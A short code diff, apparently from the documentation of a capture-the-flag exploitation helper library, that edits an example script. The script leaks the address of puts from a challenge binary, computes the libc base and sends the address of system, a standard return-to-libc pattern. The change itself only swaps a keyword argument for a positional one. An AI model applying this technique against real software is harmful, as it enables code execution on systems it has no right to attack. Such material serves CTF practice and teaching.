@@ -357,7 +357,7 @@ from pwn import p64
 
 s = CHun.script("./chall").start()
 leak = s.recv_leak("puts", "puts: ", offset=0)
-s.infer.libc_base_from_symbol_leak("puts", symbol_offset=s.libc.sym["puts"])
+s.infer.libc_base_from_symbol_leak("puts", s.libc.sym["puts"])
 s.sendline(p64(s.resolve.symbol("system")))
 """
 
